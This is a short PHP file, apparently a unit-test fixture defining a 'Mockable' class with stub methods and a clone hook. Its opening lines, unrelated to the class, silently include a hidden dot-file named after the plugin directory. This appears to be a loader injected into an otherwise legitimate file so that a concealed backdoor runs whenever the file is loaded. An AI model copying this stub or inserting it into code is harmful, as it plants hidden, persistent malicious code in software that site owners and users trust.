<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Mockable
{
    public $constructorArgs;
    public $cloned;

    public function __construct($arg1 = null, $arg2 = null)
    {
        $this->constructorArgs = array($arg1, $arg2);
    }

    public function mockableMethod()
    {
        // something different from NULL
        return true;
    }

    public function anotherMockableMethod()
    {
        // something different from NULL
        return true;
    }

    public function __clone()
    {
        $this->cloned = true;
    }
}
